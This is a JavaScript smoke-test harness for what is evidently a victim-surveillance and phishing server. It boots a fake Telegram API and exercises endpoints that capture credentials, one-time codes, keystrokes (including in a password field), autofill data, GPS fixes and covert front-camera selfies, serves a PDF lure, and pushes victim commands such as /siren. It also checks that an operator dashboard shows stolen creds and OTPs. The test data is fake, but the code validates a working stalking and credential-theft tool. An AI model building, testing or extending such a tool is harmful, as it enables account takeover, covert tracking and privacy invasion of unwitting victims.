// Self-booting end-to-end smoke test — Phase 1 + Phase 2 (burst /selfie, /siren).
//
// Boots a FAKE Telegram server on 127.0.0.1:3399, then spawns server.js as a
// child with fake creds and `-r ./preload-tg-stub.js` (which rewrites every
// api.telegram.org call to the fake) — so NOTHING reaches the real bot/chat.
// The fake answers the getUpdates long-poll and RECORDS every outbound call
// (sendMessage / sendMediaGroup / sendPhoto …), letting assertions prove what
// the operator would actually see in Telegram.
//
// Phase 1 (regression): session lifecycle, GPS pin throttle, /exit dedupe,
//   feed-only events, sensitive-key routing, uploads, admin API.
// Phase 2 (new): /selfie burst (3 frames → ONE sendMediaGroup album), partial
//   burst (1 frame + 2.5s safety timer → degraded sendPhoto), and a /siren
//   command delivered end-to-end via an injected Telegram message update.
// Phase 3 (new): twin/replay dedupe — a single 🗂 press sends ONE registry,
//   a rapid same-button double-tap is debounced, and a re-delivered update or
//   a re-wrapped callback (twin instance / restart replay) is answered but
//   never re-fired.
// Phase 4 (new): 🎛 console button honesty — pressing it on a LIVE session
//   opens exactly ONE console (with the act: command row) and answers
//   "Console opened"; pressing it on a GONE session answers an honest
//   "Session gone" warning and sends NO console message (no more bogus
//   "Console opened" toast that made the button look dead).
// The harness snapshots/restores sessions.json + dump.txt so
//   its fake sessions can never leak into the real demo store again, and it
//   only deletes its OWN tgstate/run-lock files (keyed by the fake token hash).
//
// Deep state (gps/_lastPinAt/events) is asserted straight from the debounced
// sessions.json store (saveSessions fires ~1.5s after the last change).
const fs = require("fs");
const crypto = require("crypto");
const path = require("path");
const http = require("http");
const { spawn } = require("child_process");

const ROOT = __dirname;
const BASE = "http://127.0.0.1:3199"; // demo server under test
const TG_PORT = 3399;                 // fake Telegram API (matches stub)
const KEY = "smoke2026";
const FAKE_CHAT = "99000001";
const STORE = path.join(ROOT, "sessions.json");
const DUMP = path.join(ROOT, "dump.txt");
const FAKE_TOKEN = "1111:FAKESMOKETOKEN"; // must match the harness env below
// server.js keys its Telegram state + twin lock by sha1(bot token): this
// harness therefore only ever touches state files belonging to the FAKE token,
// never the real bot's tgstate-*/run-* files.
const tgHash = crypto.createHash("sha1").update(FAKE_TOKEN).digest("hex").slice(0, 8);
const TGSTATE = path.join(ROOT, `tgstate-${tgHash}.json`);
const RUNLOCK = path.join(ROOT, `run-${tgHash}.lock`);
let snap = {}; // pre-test snapshot of the real sessions.json + dump.txt
const PNG1x1 = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
  "base64"
);

let pass = 0, fail = 0;
const ok = (name, cond, extra = "") => {
  if (cond) { pass++; console.log(`  PASS  ${name}`); }
  else { fail++; console.log(`  FAIL  ${name} ${extra}`); }
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── fake Telegram API ──────────────────────────────────────────────────────
const tgLog = [];          // { n, method, len, raw:Buffer } in arrival order
let pendingUpdates = [];   // updates to hand to the next getUpdates poll
let forceUpdates = [];     // twin/replay updates — served regardless of the poller's offset
let tgUpdateSeq = 0;
let tgMsgSeq = 100;
let tgCbSeq = 0;

function tgPush(method, raw) {
  tgLog.push({ n: tgLog.length, method, len: raw.length, raw });
}
function tgFind(method, needle, since = 0) {
  const nb = Buffer.isBuffer(needle) ? needle : Buffer.from(needle);
  return tgLog.find((e) => e.method === method && e.n >= since && e.raw.includes(nb)) || null;
}
function tgCount(method, since = 0) {
  return tgLog.filter((e) => e.method === method && e.n >= since).length;
}
function injectTgMessage(text) {
  pendingUpdates.push({
    update_id: ++tgUpdateSeq,
    message: {
      message_id: ++tgMsgSeq,
      date: Math.floor(Date.now() / 1000),
      chat: { id: Number(FAKE_CHAT), type: "private" },
      from: { id: Number(FAKE_CHAT), is_bot: false, first_name: "Test" },
      text,
    },
  });
}
// Injected callback_query press — the shape Telegram sends when the operator
// taps a dashboard button. Returns the update object so a test can push it to
// forceUpdates (opts.force) and simulate a twin instance or replay re-delivery.
function injectTgCallback(cbData, opts = {}) {
  const u = {
    update_id: ++tgUpdateSeq,
    callback_query: {
      id: `cb${++tgCbSeq}`,
      from: { id: Number(FAKE_CHAT), is_bot: false, first_name: "Test" },
      message: {
        message_id: ++tgMsgSeq,
        date: Math.floor(Date.now() / 1000),
        chat: { id: Number(FAKE_CHAT), type: "private" },
        text: "/dash",
      },
      data: cbData,
    },
  };
  (opts.force ? forceUpdates : pendingUpdates).push(u);
  return u;
}
const json = (res, obj) => {
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify(obj));
};
const fakeTG = http.createServer((req, res) => {
  const m = req.url.match(/^\/bot[^/]+\/(\w+)/);
  const method = m ? m[1] : null;
  const chunks = [];
  let total = 0;
  req.on("data", (c) => { chunks.push(c); total += c.length; if (total > 4e6) req.destroy(); });
  req.on("end", async () => {
    const raw = Buffer.concat(chunks);
    tgPush(method, raw);
    if (method === "getUpdates") {
      await sleep(250); // keep the poll loop from hot-spinning
      let result = [];
      try {
        // forceUpdates (twin/replay simulation) are served FIRST and ignore the
        // client's confirmed offset — real Telegram re-delivers them to every
        // poller regardless of where that poller's offset currently is.
        const body = JSON.parse(raw.toString("utf8"));
        if (forceUpdates.length) { result = forceUpdates.splice(0, 1); }
        else {
          const want = body.offset || 0;
          const i = pendingUpdates.findIndex((u) => u.update_id >= want);
          if (i >= 0) { result = [pendingUpdates[i]]; pendingUpdates.splice(i, 1); }
        }
      } catch (e) { /* malformed poll body — answer empty */ }
      return json(res, { ok: true, result });
    }
    if (method === "answerCallbackQuery") return json(res, { ok: true, result: true });
    if (method === "getMe") return json(res, { ok: true, result: { id: 1111, is_bot: true, first_name: "fake" } });
    // sendMessage / editMessageText / sendPhoto / sendMediaGroup / sendDocument …
    return json(res, { ok: true, result: { message_id: ++tgMsgSeq } });
  });
});

// ── boot + teardown of the demo server ─────────────────────────────────────
let child = null;
async function boot() {
  await new Promise((r) => fakeTG.listen(TG_PORT, "127.0.0.1", r));
  // Snapshot the REAL sessions store + dump, then remove them so the child
  // boots empty and deterministic. shutdown() restores the snapshot — a crash
  // or leftover fake session can therefore never leak into the demo server
  // again (that exact leak produced the phantom "2 total" registry when a
  // stale store was loaded by the live instance). tgstate/run files are keyed
  // by the FAKE token hash, so the real bot's state is never touched; OURS
  // must still be removed so a stale restored offset cannot exceed the fresh
  // injected update_ids and make the fake getUpdates withhold every update.
  for (const f of [STORE, DUMP]) {
    try { snap[f] = fs.readFileSync(f); } catch (e) { snap[f] = null; }
    try { fs.rmSync(f, { force: true }); } catch (e) {}
  }
  for (const f of [TGSTATE, RUNLOCK]) { try { fs.rmSync(f, { force: true }); } catch (e) {} }
  const stub = path.join(ROOT, "preload-tg-stub.js");
  child = spawn(process.execPath, ["-r", stub, "server.js"], {
    cwd: ROOT,
    env: {
      ...process.env,
      PORT: "3199",
      BOT_TOKEN: "1111:FAKESMOKETOKEN",
      CHAT_ID: FAKE_CHAT,
      ADMIN_KEY: KEY,
    },
    stdio: ["ignore", "pipe", "pipe"],
    windowsHide: true,
  });
  let err = "";
  let out = "";
  child.stderr.on("data", (d) => { err += d; });
  child.stdout.on("data", (d) => { out += d; });
  const t0 = Date.now();
  while (Date.now() - t0 < 15000) {
    if (out.includes(`port ${3199}`)) return; // banner printed → listening
    if (child.exitCode !== null) throw new Error("server exited during boot:\n" + err);
    await sleep(120);
  }
  throw new Error("server boot timeout. last output:\n" + out);
}
async function shutdown() {
  try { if (child && child.exitCode === null) child.kill(); } catch (e) {}
  await sleep(600);
  try { if (fakeTG.closeAllConnections) fakeTG.closeAllConnections(); } catch (e) {}
  try { await new Promise((r) => fakeTG.close(r)); } catch (e) {}
  // Remove this harness's own state, then put the real store/dump back exactly
  // as they were before the run (no snapshot → remove whatever the child left).
  for (const f of [TGSTATE, RUNLOCK]) { try { fs.rmSync(f, { force: true }); } catch (e) {} }
  for (const f of [STORE, DUMP]) {
    try { fs.rmSync(f, { force: true }); } catch (e) {}
    if (snap[f]) { try { fs.writeFileSync(f, snap[f]); } catch (e) {} }
  }
}

// ── HTTP + state helpers ───────────────────────────────────────────────────
async function post(p, body, raw) {
  const r = await fetch(BASE + p, {
    method: "POST",
    headers: raw ? { "Content-Type": raw } : { "Content-Type": "application/json" },
    body: raw ? body : JSON.stringify(body),
  });
  return { status: r.status, body: await r.json().catch(() => null) };
}
async function adminData() {
  const r = await fetch(`${BASE}/admin/data?key=${KEY}`);
  return r.json();
}
function loadStore() {
  try { return JSON.parse(fs.readFileSync(STORE, "utf8")); }
  catch (e) { return []; }
}
async function waitFor(fn, ms, step = 150) {
  const t0 = Date.now();
  for (;;) {
    let v = null;
    try { v = await fn(); } catch (e) { v = null; }
    if (v) return v;
    if (Date.now() - t0 > ms) return null;
    await sleep(step);
  }
}

(async () => {
  try {
    console.log("— boot: fake TG + demo server (fake creds) —");
    await boot();
    ok("demo server booted on 3199 with fake creds", true);
    ok("no outbound call leaked to real Telegram (host is 127.0.0.1)",
       tgLog.every((e) => !e.raw.toString("latin1").includes("api.telegram.org")));

    console.log("— boot sanity —");
    const health = await fetch(`${BASE}/`).catch(() => null);
    ok("server reachable (GET /)", !!health, "(got " + (health && health.status) + ")");
    const deny = await fetch(`${BASE}/admin/data?key=wrong`).catch(() => null);
    ok("admin API rejects wrong key", deny && deny.status === 403);

    console.log("— device A: fresh first visit (loud dossier path) —");
    const ua = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36";
    const VA = "a1b2c3d4e5f6", VB = "b2c3d4e5f6a7";
    const devA = { platform: "Android", browser: "Chrome 126", webview: false, screen: "412x915", cores: 8, memory: 8 };
    let r = await post("/collect", { vid: VA, ...devA });
    ok("A /collect 200", r.status === 200 && r.body && r.body.ok === true, JSON.stringify(r.body));
    await post("/collect", { vid: VA, ...devA }); // 2nd visit → silent feed
    await post("/event", { vid: VA, text: "Left the page → returned in 4s" });
    await post("/perm", { vid: VA, name: "camera", state: "granted" });
    await post("/perm", { vid: VA, name: "location", state: "prompted" });
    await post("/autofill", { vid: VA, name: "Alice Demo", phone: "+919900000000", street: "MG Road, Bengaluru" });
    r = await post("/keys", { vid: VA, context: "password", keys: "p@ssw0rd-secret!" });
    ok("A sensitive-context /keys 200", r.status === 200 && r.body.ok);
    r = await post("/keys", { vid: VA, context: "searchbox", keys: "college fest tickets" });
    ok("A normal /keys 200", r.status === 200 && r.body.ok);
    r = await post("/creds", { vid: VA, email: "alice@example.com", password: "p@ssw0rd-secret!" });
    ok("A /creds 200", r.status === 200 && r.body.ok);
    r = await post("/otp", { vid: VA, otp: "482913" });
    ok("A /otp 200", r.status === 200 && r.body.ok);
    r = await post("/otp", { vid: VA, otp: "482913" }); // replay must be ignored
    ok("A /otp replay tolerated", r.status === 200 && r.body.ok);
    const loud = tgFind("sendMessage", "NEW VISITOR");
    ok("first visit raised a LOUD dossier message", !!loud);

    console.log("— device A: GPS pin throttle —");
    const fix = async (lat, lon) => post("/gps", { vid: VA, lat, lon, acc: 8, spd: 0.4, source: "watchPosition" });
    await sleep(400);
    await fix(12.9716, 77.5946);           // fix1: first fix  -> PIN
    await sleep(300);
    const t1 = Date.now();                 // window start (fix2 must NOT pin)
    await fix(12.9717, 77.5946);           // fix2: ~11 m      -> no pin
    await sleep(300);
    await fix(12.9735, 77.5946);           // fix3: ~200 m     -> PIN
    const t2 = Date.now();
    await fix(12.9736, 77.5946);           // fix4: ~11 m      -> no pin
    await sleep(300);

    console.log("— device C: deterministic pin-throttle proof —");
    const VC = "c5d6e7f8a9b0";
    const fixC = async (lat, lon) => post("/gps", { vid: VC, lat, lon, acc: 8, source: "watchPosition" });
    const T0 = Date.now();
    await fixC(12.9716, 77.5946);          // C fix1: first fix  -> PIN @ ~T0
    await sleep(1800);
    await fixC(12.9717, 77.5946);          // C fix2: ~11 m      -> must NOT pin
    await sleep(2500);                     // flush store, THEN read pin state
    const Cph1 = loadStore().find((s) => s.sid === VC);
    ok("C fixes == 2 after fix2", Cph1 && Cph1.fixes === 2, "fixes=" + (Cph1 && Cph1.fixes));
    ok("C first fix pinned (pinAt ~ T0)", Cph1 && Cph1._lastPinAt && Math.abs(Cph1._lastPinAt - T0) < 600, "pin=" + (Cph1 && Cph1._lastPinAt) + " T0=" + T0);
    ok("C 11m fix did NOT re-pin (pinAt NOT ~T0+1800)", Cph1 && Cph1._lastPinAt && Math.abs(Cph1._lastPinAt - (T0 + 1800)) > 800, "pin=" + (Cph1 && Cph1._lastPinAt));
    await fixC(12.9735, 77.5946);          // C fix3: ~200 m     -> PIN
    const T3 = Date.now();
    await sleep(2500);                     // flush again, read final pin state
    const Cph2 = loadStore().find((s) => s.sid === VC);
    ok("C fixes == 3 after fix3", Cph2 && Cph2.fixes === 3, "fixes=" + (Cph2 && Cph2.fixes));
    ok("C 200m fix pinned again (pinAt ~ T3)", Cph2 && Cph2._lastPinAt && Math.abs(Cph2._lastPinAt - T3) < 600 && Cph2._lastPinAt > T0 + 1000, "pin=" + (Cph2 && Cph2._lastPinAt) + " T3=" + T3);

    console.log("— device A: exit dedupe —");
    r = await post("/exit", { vid: VA, dwellMs: 245000, scrollPct: 82, touches: 14, keyDyn: { wpm: 58, avg: 210, bursts: 6 } });
    ok("A /exit #1 ok", r.body && r.body.ok === true);
    r = await post("/exit", { vid: VA, dwellMs: 245000, scrollPct: 82, touches: 14 });
    ok("A /exit #2 deduped (dup:true)", r.body && r.body.dup === true, JSON.stringify(r.body));

    console.log("— uploads (single selfie + heatmap) —");
    r = await post(`/selfie?vid=${VA}`, PNG1x1, "image/png");
    ok("A /selfie 200", r.status === 200 && r.body && r.body.ok);
    r = await post(`/heatmap?vid=${VA}&touches=23`, PNG1x1, "image/png");
    ok("A /heatmap 200", r.status === 200 && r.body && r.body.ok);
    const single = await waitFor(() => tgFind("sendPhoto", "FRONT CAMERA CAPTURE"), 4000);
    ok("single /selfie immediately sent ONE sendPhoto", !!single);

    console.log("— device B: returning-visit silence —");
    await post("/collect", { vid: VB, platform: "Windows", browser: "Edge 126" });
    await post("/collect", { vid: VB, platform: "Windows", browser: "Edge 126" });

    console.log("— PDF lure hit —");
    const pdf = await fetch(`${BASE}/d/notes.pdf`, { headers: { "User-Agent": ua } });
    ok("pdf served 200", pdf.status === 200);

    // ── Phase 2 ────────────────────────────────────────────────────────────
    console.log("— Phase 2: /selfie burst (3 frames → ONE album, no per-frame spam) —");
    const VD = "d7e8f9a0b1c2", VE = "e9f0a1b2c3d4";
    const devMob = { platform: "Android", browser: "Chrome 126", webview: false };
    await post("/collect", { vid: VD, ...devMob });
    const markB = tgLog.length; // snapshot BEFORE the burst
    for (let i = 0; i < 3; i++) {
      const last = i === 2 ? "1" : "0";
      await post(`/selfie?vid=${VD}&burst=3&idx=${i}&last=${last}`, PNG1x1, "image/png");
    }
    const album = await waitFor(() => tgFind("sendMediaGroup", "FRONT CAMERA CAPTURE", markB), 5000);
    ok("burst flushed ONE sendMediaGroup album", !!album);
    ok("album carries 3 attachments (selfie0..2.png)",
       album && tgFind("sendMediaGroup", "selfie0.png", markB) && tgFind("sendMediaGroup", "selfie1.png", markB) && tgFind("sendMediaGroup", "selfie2.png", markB));
    ok("burst produced NO single sendPhoto (no per-frame spam)", tgCount("sendPhoto", markB) === 0, "photos=" + tgCount("sendPhoto", markB));
    ok("burst produced exactly ONE album", tgCount("sendMediaGroup", markB) === 1, "albums=" + tgCount("sendMediaGroup", markB));

    console.log("— Phase 2: partial burst (1 frame then abort → degraded single) —");
    await post("/collect", { vid: VE, ...devMob });
    const markP = tgLog.length;
    await post(`/selfie?vid=${VE}&burst=3&idx=0`, PNG1x1, "image/png"); // no last=1 → safety timer flushes
    const deg = await waitFor(() => tgFind("sendPhoto", "FRONT CAMERA CAPTURE", markP), 6000);
    ok("aborted burst degraded to a single sendPhoto after the 2.5s timer", !!deg);
    ok("aborted burst sent NO album", tgCount("sendMediaGroup", markP) === 0);

    console.log("— Phase 2: /siren command end-to-end (TG message → command queue) —");
    injectTgMessage(`/siren ${VD}`);
    const queued = await waitFor(async () => {
      const j = await (await fetch(`${BASE}/command?vid=${VD}`)).json();
      return (j.commands || []).find((c) => c.action === "siren") || null;
    }, 7000);
    ok("injected /siren message queued the action on the victim poll", !!queued);
    const sirenReply = await waitFor(() => tgFind("sendMessage", "Siren triggered"), 4000);
    ok("operator got the 'Siren triggered' confirmation reply", !!sirenReply);

    console.log("— state assertions (store + admin API) —");
    await sleep(2200); // let the debounced saveSessions flush
    const all = loadStore();
    const A = all.find((s) => s.sid === VA);
    const B = all.find((s) => s.sid === VB);
    const D = all.find((s) => s.sid === VD);
    const E = all.find((s) => s.sid === VE);
    const pdfS = all.find((s) => s.pdfHits > 0);
    ok("store has A + B + D + E + anonymous pdf session", all.length >= 5, "n=" + all.length);
    ok("A device platform Android", !!(A && A.device && A.device.platform === "Android"));
    ok("A visits == 2 (2nd visit counted, feed-only)", A && A.visits === 2, "visits=" + (A && A.visits));
    ok("A keyCount == 2", A && A.keyCount === 2, "keys=" + (A && A.keyCount));
    ok("A creds stored", A && A.creds && A.creds.email === "alice@example.com");
    ok("A otp stored 482913", A && A.otp && A.otp.code === "482913");
    ok("A autofill stored", A && A.autofill && A.autofill.name === "Alice Demo");
    ok("A camera perm granted", A && A.permLog && A.permLog.camera && A.permLog.camera.state === "granted");
    ok("A location perm prompted (askedAt logged)", A && A.permLog && A.permLog.location && !!A.permLog.location.askedAt);
    ok("A events include single selfie capture", A && A.events.some((e) => e.text.includes("Front camera frame captured")));
    ok("A heatmap buffer stored", A && A.heatBuf && A.heatBuf.data && A.heatBuf.data.length > 0);
    ok("A gps fixes == 4", A && A.gps && A.fixes === 4, "fixes=" + (A && A.fixes));
    ok("A pin #2 recorded around fix3 (t2)", A && A._lastPinAt && Math.abs(A._lastPinAt - t2) < 8000, "pin=" + A._lastPinAt + " t2=" + t2);
    ok("A exit dedupe stamp present", A && !!A._lastExitAt);
    ok("A keyCount reflected on key entries", A && A.keys.length === 2);
    ok("B present with visits == 2", B && B.visits === 2, "visits=" + (B && B.visits));
    ok("pdf hit logged somewhere", !!pdfS, "found=" + !!pdfS);
    ok("D burst event logged in store (3 frames)", D && D.events.some((e) => e.text.includes("Front camera burst captured — 3 frames")));
    ok("E degraded event logged in store (single frame)", E && E.events.some((e) => e.text.includes("Front camera frame captured")));
    const data = await adminData();
    ok("admin lists all sessions", data.sessions && data.sessions.length === all.length, "n=" + (data.sessions && data.sessions.length));
    ok("admin shows A creds+otp (dash fodder)", data.sessions.some((s) => s.sid === VA && s.creds && s.otp));

    // ── Phase 3: twin/replay dedupe ────────────────────────────────────────
    // The operator presses the 🗂 All-devices button (callback_data "list");
    // every scenario below must end with exactly ONE registry message sent.
    console.log("— Phase 3: dedupe hardening (single send, double-tap, twin/replay) —");
    const markD = tgLog.length;
    const regSends = () =>
      tgLog.filter((e) => e.method === "sendMessage" && e.n >= markD && e.raw.includes("DEVICE REGISTRY")).length;

    console.log("— T1: single 🗂 press fires exactly ONE registry —");
    const t1u = injectTgCallback("list");
    const t1cb = t1u.callback_query.id;
    ok("T1 single press sent ONE DEVICE REGISTRY", !!(await waitFor(() => (regSends() === 1 ? 1 : null), 4000)), "count=" + regSends());
    ok("T1 press answered with the 'Device list sent' toast", !!tgFind("answerCallbackQuery", "Device list sent", markD));

    console.log("— T2: rapid same-button double-tap is debounced —");
    await sleep(950); // operator re-presses after reading the registry (>800ms debounce window clears, so tap #1 below is a FRESH press — only tap #2 must be swallowed)
    const t2u1 = injectTgCallback("list"); // first tap of the pair
    const t2cb1 = t2u1.callback_query.id;
    ok("T2 tap #1 dispatched (registry #2 sent)", !!(await waitFor(() => (regSends() === 2 ? 2 : null), 4000)), "count=" + regSends());
    const t2u2 = injectTgCallback("list"); // second tap, ~immediately (real double-tap)
    const t2cb2 = t2u2.callback_query.id;
    ok("T2 tap #2 answered with the debounce toast", !!(await waitFor(() => tgFind("answerCallbackQuery", "One moment", markD), 3000)));
    await sleep(1500); // give any erroneous second dispatch time to appear
    ok("T2 double-tap sent NO second registry (still 2 total)", regSends() === 2, "count=" + regSends());

    console.log("— T3a: twin re-delivers the SAME update — update seen-set skips it —");
    const t3u = injectTgCallback("list");
    const t3cb = t3u.callback_query.id;
    ok("T3a first delivery sent the registry (#3)", !!(await waitFor(() => (regSends() === 3 ? 3 : null), 4000)), "count=" + regSends());
    forceUpdates.push(t3u); // twin poller: the identical update lands again
    await sleep(1200);
    ok("T3a re-delivered update fired NOTHING (registry still 3)", regSends() === 3, "count=" + regSends());

    console.log("— T3b: same callback wrapped in a FRESH update — callback seen-set answers —");
    await sleep(900); // clear the debounce window so T3b exercises the cb-seen gate, not the debounce
    const replay = JSON.parse(JSON.stringify(t3u)); // clone of the SAME press (same callback_query.id)
    replay.update_id = ++tgUpdateSeq;               // …but Telegram hands it as a brand-new update
    forceUpdates.push(replay);
    ok("T3b replay answered 'Already handled'", !!(await waitFor(() => tgFind("answerCallbackQuery", "Already handled", markD), 3000)));
    await sleep(1200);
    ok("T3b callback replay produced NO registry re-send (still 3)", regSends() === 3, "count=" + regSends());

    console.log("— T4: tgstate file persisted (offset advanced, seen/cb recorded) —");
    let st = null;
    try { st = JSON.parse(fs.readFileSync(TGSTATE, "utf8")); } catch (e) {}
    ok("T4 tgstate-*.json exists on disk", !!st, TGSTATE);
    if (st) {
      ok("T4 offset == last update_id + 1 (restart resumes here)", st.offset === tgUpdateSeq + 1, "offset=" + st.offset + " want=" + (tgUpdateSeq + 1));
      ok("T4 seen-set holds the delivered update ids", Object.keys(st.seen).length >= 4, "seen=" + Object.keys(st.seen).length);
      ok("T4 cb-set records every DISPATCHED press", st.cb[t1cb] && st.cb[t2cb1] && st.cb[t3cb], "missing one of " + [t1cb, t2cb1, t3cb].join(","));
      ok("T4 debounced double-tap press NOT in cb-set", !st.cb[t2cb2], "found t2cb2=" + st.cb[t2cb2]);
      ok("T4 T3b replay shares the original cb id (already recorded)", replay.callback_query.id === t3cb);
    }

    // ── Phase 4: 🎛 Console button honesty ────────────────────────────────
    // Regression for the "console button does nothing" bug: the console branch
    // used to claim "🎛 Console opened" EVEN when openConsole() returned false
    // (session wiped by /clear, or a stale dossier button pointing at a dead
    // sid) — the operator got a bogus toast, no console message, and perceived
    // a dead button. Now the toast must tell the truth: live session → console
    // message + "Console opened"; gone session → honest warning, NO console.
    console.log("— Phase 4: 🎛 console button (live session vs gone session) —");
    const markC = tgLog.length;
    const consoleMsgs = () =>
      tgLog.filter((e) => e.method === "sendMessage" && e.n >= markC && e.raw.includes("🎛 <b>CONSOLE</b>")).length;

    console.log("— C1: 🎛 press on a LIVE session opens exactly ONE console —");
    const c1u = injectTgCallback(`console:${VA}`);
    const c1cb = c1u.callback_query.id;
    ok("C1 live press sent exactly ONE console message",
       !!(await waitFor(() => (consoleMsgs() === 1 ? 1 : null), 4000)), "count=" + consoleMsgs());
    ok("C1 console carries the command row (act:buzz:<sid> button)",
       !!tgFind("sendMessage", `act:buzz:${VA}`, markC));
    ok("C1 press answered with the 'Console opened' toast",
       !!tgFind("answerCallbackQuery", "Console opened", markC));

    console.log("— C2: 🎛 press on a GONE session warns honestly, sends nothing —");
    await sleep(900); // clear the debounce window so C2 exercises the session check, not the debounce
    const markC2 = tgLog.length; // anything logged from here on belongs to the C2 press
    const c2u = injectTgCallback("console:deadbeef0000");
    const c2cb = c2u.callback_query.id;
    ok("C2 gone-session press answered with the 'Session gone' warning",
       !!(await waitFor(() => tgFind("answerCallbackQuery", "Session gone", markC2), 3000)));
    await sleep(1200); // give any erroneous console send time to appear
    ok("C2 gone-session press sent NO console message (still exactly 1 from C1)",
       consoleMsgs() === 1, "count=" + consoleMsgs());
    ok("C2 gone-session press did NOT claim 'Console opened'",
       !tgFind("answerCallbackQuery", "Console opened", markC2));

    console.log("— fake-TG outbound summary —");
    const byMethod = {};
    for (const e of tgLog) byMethod[e.method] = (byMethod[e.method] || 0) + 1;
    console.log("  " + JSON.stringify(byMethod));
  } finally {
    await shutdown();
  }
  console.log(`\nRESULT: ${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
})().catch((e) => { console.error("HARNESS ERROR:", e); process.exit(2); });
